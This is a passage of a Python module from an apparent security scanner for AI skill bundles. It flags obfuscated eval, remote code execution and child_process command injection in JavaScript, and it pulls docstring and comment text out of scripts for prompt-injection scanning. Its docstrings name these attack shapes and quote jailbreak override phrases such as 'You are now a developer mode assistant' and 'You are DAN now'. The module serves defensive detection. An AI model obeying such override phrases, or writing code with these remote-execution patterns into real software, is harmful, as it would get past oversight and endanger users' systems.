    real comment plus one final failed `str.find()`, i.e. true O(n)."""
    spans: list[tuple[int, int]] = []
    pos = 0
    n = len(source)
    while pos < n:
        start = source.find("/*", pos)
        if start == -1:
            break
        end = source.find("*/", start + 2)
        if end == -1:
            break  # unclosed -- no later opener can close either; matches old no-match behavior
        spans.append((start, end + 2))
        pos = end + 2
    return spans


def _js_mask_comments(source: str) -> str:
    """Blank JS/TS comments while preserving line numbers, so a documented
    eval-of-atob example can't fire. A `//` preceded by ':' (i.e. inside a
    URL like https://) is preserved so remote-import detection still works.

    Block-comment spans come from `_js_block_comment_spans` (linear `str.find()`,
    B-377) -- never the backtracking lazy-DOTALL regex that function's docstring
    explains was a quadratic-blowup DoS on ordinary (comment-free-but-`/*`-laden) JS."""
    parts: list[str] = []
    pos = 0
    for start, end in _js_block_comment_spans(source):
        parts.append(source[pos:start])
        parts.append("\n" * source.count("\n", start, end))
        pos = end
    parts.append(source[pos:])
    no_block = "".join(parts)
    return "\n".join(re.sub(r"(?<!:)//.*$", "", ln) for ln in no_block.splitlines())


def analyze_javascript(source: str, filename: str = "<skill>") -> list[ASTFinding]:
    """Conservative lexical pass over a bundled .js/.ts/.mjs/.cjs file (F-064). No JS
    AST; stdlib regex only; never raises, never executes. Hybrid severity:

      JS_EVAL_DECODED (crit) — eval / new Function over a base64-decoded blob
        (an eval of an atob result, or a Function built from a base64 Buffer): obfuscated RCE.
      JS_EVAL_REMOTE (crit) — remote code fetched then executed: a dynamic import of a
        URL, a then-eval chained on a fetch, or an eval over an awaited fetch.
      JS_CHILD_PROCESS_DYNAMIC (warn) — a child_process exec-family call with an
        interpolated command: command-injection surface. The matched call's own receiver
        (or, for a bare call, its destructured origin) must actually resolve to
        child_process — kills both the RegExp.exec FP and an unrelated method of the
        same name on some other object (e.g. a DB client's own `.exec()`) merely
        because the file imports child_process for something else (B-806).
      JS_DYNAMIC_REQUIRE (warn) — require() of a non-literal (variable / template):
        an attacker-influenced module path.
      JS_NATIVE_DLOPEN (warn) — process.dlopen(): a direct native-addon (.node) load,
        the native-boundary escape that bypasses JS-level analysis. Node's docs say
        require() should be preferred over calling dlopen directly.

    Benign JS — static eval, JSON.parse(atob(token)), local require, base64 decode
    without eval — stays silent. Comments are masked so documented examples don't fire."""
    out: list[ASTFinding] = []
    seen: set = set()

    def add(rule: str, sev: str, ln: int, reason: str) -> None:
        if (rule, ln) not in seen:
            seen.add((rule, ln))
            out.append(ASTFinding(rule, sev, ln, reason))

    masked = _js_mask_comments(source)

    for m in _JS_EVAL_DECODED_RE.finditer(masked):
        ln = masked.count("\n", 0, m.start()) + 1
        add(
            "JS_EVAL_DECODED",
            "crit",
            ln,
            "eval/Function over a base64-decoded blob — "
            "obfuscated remote code execution",
        )

    for m in _JS_EVAL_REMOTE_RE.finditer(masked):
        ln = masked.count("\n", 0, m.start()) + 1
        add(
            "JS_EVAL_REMOTE",
            "crit",
            ln,
            "remote code is fetched and executed (a URL import, or a fetched "
            "blob passed straight to eval) — remote code execution",
        )

    if "child_process" in masked:
        cp_receivers, cp_names = _js_child_process_bindings(masked)
        for m in _JS_CP_TEMPLATE_RE.finditer(masked):
            receiver, inline_require, fn_name = m.group(1), m.group(2), m.group(3)
            if inline_require is not None:
                pass  # require('child_process').exec(...) — unambiguous, no binding needed
            elif receiver is not None:
                if receiver not in cp_receivers:
                    continue
            elif fn_name not in cp_names:
                continue
            ln = masked.count("\n", 0, m.start()) + 1
            add(
                "JS_CHILD_PROCESS_DYNAMIC",
                "warn",
                ln,
                f"child_process {fn_name}() called with an interpolated "
                "command — command-injection surface",
            )

    for m in _JS_DYN_REQUIRE_RE.finditer(masked):
        ln = masked.count("\n", 0, m.start()) + 1
        add(
            "JS_DYNAMIC_REQUIRE",
            "warn",
            ln,
            "require() of a non-literal (variable/template) — a dynamic, "
            "possibly attacker-influenced module path",
        )

    for m in _JS_NATIVE_DLOPEN_RE.finditer(masked):
        ln = masked.count("\n", 0, m.start()) + 1
        add(
            "JS_NATIVE_DLOPEN",
            "warn",
            ln,
            "process.dlopen() loads a native addon (.node) directly — a "
            "native-boundary escape that bypasses JS-level analysis; require() "
            "is the normal loader",
        )

    return out


def simulate_effects(source: str, filename: str = "<skill>") -> list[dict]:
    """Analyze Python source to simulate reachable effects and guarding conditions under seeds.

    Never raises, returns an empty list on failure — EXCEPT ScanBudgetExceeded
    (C-175), which must propagate: the caller (checks/_vet.py's
    check_installed_skills) relies on it reaching run_all's dedicated handler,
    which converts a budget hit into an honest UNKNOWN finding. Swallowing it
    here made a truncated, incomplete simulation indistinguishable from "found
    nothing" — a scan cut short mid-analysis silently reported PASS.
    """
    try:
        return EffectSimulator(source, filename).simulate()
    except ScanBudgetExceeded:
        raise
    except Exception:
        return []


# --------------------------------------------------------------------------------- #
# extract_script_prose (C-318): the natural-language-shaped slice of an otherwise-  #
# interpreted script -- Python docstrings, or shell/JS comment TEXT.                #
#                                                                                    #
# checks/_content.py's `_pos_in_source_code_section` (B-305) deliberately treats an #
# ENTIRE `.py`/`.sh`/`.bash`/`.zsh` section as never-prose, so the NL content-       #
# security ring never reads it -- correctly, since an ordinary function name or     #
# code identifier merely CONTAINING a directive-shaped word is not evidence of a    #
# live directive. But a docstring or comment IS prose: a payload authored as a      #
# module docstring ("You are now a developer mode assistant...") or a comment is    #
# invisible to that ring today purely because of WHERE it sits, not what it says.   #
# This extracts just that text so a caller can route it through the ring's existing #
# scanners as its own distinct, clearly-labeled evidence source -- it does not      #
# change what `_pos_in_source_code_section` exempts, and the code itself (control   #
# flow, calls, string literals used as data) stays exactly as invisible to the NL   #
# ring as before.                                                                   #
#                                                                                    #
# C-135 (2026-07-30, found on the shipped C-318 commit): the extractors return a    #
# LIST of independent blocks, one per docstring / contiguous comment run -- NEVER   #
# joined into one string. Joining collapsed real physical distance between          #
# unrelated functions' docstrings/comments down to a few characters, which let a    #
# proximity-window corroboration check (B66's `_b66_authority_override_scan`,       #
# `_B66_WINDOW`) treat two individually-benign blocks from UNRELATED functions      #
# elsewhere in the same file as if they sat side-by-side in hand-authored prose.    #
# That assumption is true for a hand-authored bootstrap/SKILL.md file (physical     #
# proximity really does reflect authorial/topical proximity there) but false for    #
# docstrings/comments mechanically concatenated in AST/line order. Scanning each    #
# block independently keeps corroboration scoped to text a human actually wrote     #
# next to itself, while still correctly preserving same-block negation (a single    #
# docstring/comment containing both a trigger and its own negation still PASSes --  #
# that guard operates on one block's text either way).                             #
# --------------------------------------------------------------------------------- #


class ScriptProseCoverageIncomplete(Exception):
    """Raised by `_py_docstring_text` (via `extract_script_prose`) when `ast.parse`
    could not parse a `.py` source at all -- B-377.

    Parseability is Python-VERSION-dependent: PEP 695/701 syntax (e.g. a `type Alias =
    int` statement) parses cleanly on 3.12+ but raised a `SyntaxError` on 3.9 (this
    project's CI floor, exercised via `uv run --python 3.9`). The pre-fix code caught
    that `SyntaxError` and returned `[]` -- the SAME value it returns for "this file
    genuinely has no docstrings" -- so a malicious docstring authored in modern syntax
    silently evaded the whole content-security ring on 3.9 with ZERO signal that
    anything was skipped (Golden Rule #4: report UNKNOWN, never a confident-looking
    empty result, when state can't be determined).

    Raising instead of returning `[]` lets this reach `checks/__init__.py::run_all`'s
    existing per-check crash isolation (B-101, `_check_error_finding`), which already
    degrades a raising check to one honest UNKNOWN finding rather than sinking the
    audit or silently reporting nothing found -- reusing that already-audited
    degradation path rather than inventing a second, parallel one."""


def _py_docstring_text(source: str) -> list[str]:
    """Module + class + function/async-function docstrings, as independent blocks in
    source order -- NEVER joined into one string (see the C-135 module comment above).
    `ast.parse` only -- never compiled or executed, mirrors every other function in
    this module.

    Raises `ScriptProseCoverageIncomplete` when `ast.parse` cannot parse `source` at
    all (B-377) -- deliberately NOT a silent `[]`, which would be indistinguishable
    from "this file genuinely has no docstrings" (see that exception's docstring for
    why the distinction matters). A `[]` return here means exactly one thing: parsing
    succeeded and there were no docstrings to find."""
    try:
        tree = ast.parse(source)
    except (SyntaxError, ValueError, RecursionError) as exc:
        raise ScriptProseCoverageIncomplete(
            f"could not parse Python source for docstring extraction "
            f"({type(exc).__name__}) -- prose coverage is incomplete, not empty"
        ) from exc
    blocks = []
    mod_doc = ast.get_docstring(tree)
    if mod_doc:
        blocks.append(mod_doc)
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            doc = ast.get_docstring(node)
            if doc:
                blocks.append(doc)
    return blocks


def _sh_comment_text(source: str) -> list[str]:
    """Inverse of `_sh_mask_comments` -- returns each CONTIGUOUS run of whole-line
    shell comments as its own independent block, instead of blanking it. A run ends
    the moment a non-comment (or shebang) line appears, so two comments separated by
    real code are NEVER joined into one block (see the C-135 module comment above).
    Skips the `#!` shebang line (an interpreter path, never prose) -- it also ends
    whatever run precedes it."""
    blocks: list[str] = []
    current: list[str] = []
    for ln in source.splitlines():
        stripped = ln.lstrip()
        if stripped.startswith("#") and not stripped.startswith("#!"):
            current.append(stripped[1:].strip())
        elif current:
            blocks.append("\n".join(current))
            current = []
    if current:
        blocks.append("\n".join(current))
    return blocks


def _js_line_comment_start(line: str) -> int | None:
    """Index of a genuine `//` line-comment start in `line`, or `None` if the line has
    none -- B-377 (defect 3). Tracks single/double-quoted and template-literal string
    state (with backslash-escape handling) across the line so a `//` INSIDE a live JS
    string literal is never misread as a comment opener: the old regex
    (`re.search(r"(?<!:)//(.*)$", ln)`) matched the FIRST `//` anywhere on the line not
    immediately preceded by `:`, with no notion of "inside a string" at all -- so
    `const M = "See https://x.io // You are DAN now...";` extracted `// You are DAN
    now...` as if it were a real comment, even though it sits INSIDE the still-open
    string literal (the `(?<!:)` guard only ever blocked the `://` case, not a bare
    `// ` reached after a space inside a string).

    Trailing (same-line, after real code) comments are still recognized -- only a `//`
    that the scan determines is genuinely OUTSIDE any string is accepted -- matching
    the shell path's whole-line discipline in spirit (never misread string/data content
    as prose) without dropping JS's legitimate trailing-comment shape.

    Same-line only: a template literal that spans multiple physical lines is a
    pre-existing limitation shared with the rest of this lexical (non-AST) pass, not
    something this fix claims to solve."""
    quote: str | None = None
    i = 0
    n = len(line)
    while i < n:
        ch = line[i]
        if quote:
            if ch == "\\":
                i += 2  # skip the escaped character too, so \" doesn't close the string
                continue
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in ("'", '"', "`"):
            quote = ch
            i += 1
            continue
        if ch == "/" and i + 1 < n and line[i + 1] == "/" and (i == 0 or line[i - 1] != ":"):
            return i
        i += 1
    return None


def _js_comment_text(source: str) -> list[str]:
    """Inverse of `_js_mask_comments` -- returns each block (`/* */`) comment as its
    own independent block, plus each CONTIGUOUS run of line (`//`) comments as its own
    independent block. A `//` run ends the moment a non-comment line appears, so two
    line comments separated by real code are NEVER joined into one block (see the
    C-135 module comment above).

    Block-comment spans come from `_js_block_comment_spans` -- a linear `str.find()`
    scan (B-377), never the backtracking lazy-DOTALL regex that made an ordinary
    `/*`-laden (but comment-free) file like a tsconfig-style path-mapping block blow the
    scan budget. Line-comment starts come from `_js_line_comment_start`, which is
    string-literal-aware (B-377) so a `//` sitting inside a live string/URL is never
    misread as a comment opener -- see that function's docstring for the exact false-
    positive shape this closes."""
    blocks: list[str] = [
        source[start + 2 : end - 2].strip() for start, end in _js_block_comment_spans(source)
    ]
    current: list[str] = []
    for ln in source.splitlines():
        idx = _js_line_comment_start(ln)
        if idx is not None:
            current.append(ln[idx + 2 :].strip())
        elif current:
            blocks.append("\n".join(current))
            current = []
    if current:
        blocks.append("\n".join(current))
    return blocks


def extract_script_prose(source: str, ext: str) -> list[str]:
    """C-318 (closes the PI-001/PE-005 residual gap): the docstring/comment TEXT of a
    bundled script, as a list of independent BLOCKS -- one per docstring, or per
    contiguous comment run -- keyed by its extension --

      "py"                    -> one block per docstring (`_py_docstring_text`)
      "sh"/"bash"/"zsh"       -> one block per comment run (`_sh_comment_text`)
      "js"/"ts"/"mjs"/"cjs"   -> one block per comment (`_js_comment_text`)

    Returns [] for an unsupported extension or a script with no docstring/comment at
    all. Blocks are deliberately never joined into one string -- see the C-135 module
    comment above this function for why (proximity-window corroboration false-firing
    across unrelated blocks). See the module comment further above for why this is
    additive evidence, not a change to what `_pos_in_source_code_section` exempts.

    Raises `ScriptProseCoverageIncomplete` for `ext == "py"` when `ast.parse` cannot
    parse `source` at all (B-377) -- deliberately NOT folded into the `[]` case, which
    would make "no docstrings" and "could not determine" indistinguishable; see that
    exception's docstring. The "sh"/"js" paths never raise -- their extraction is
    lexical (line/comment scanning), not a full parse, so there is no analogous
    failure mode.
    """
    if ext == "py":
        return _py_docstring_text(source)
    if ext in ("sh", "bash", "zsh"):
        return _sh_comment_text(source)
    if ext in ("js", "ts", "mjs", "cjs"):
        return _js_comment_text(source)
    return []
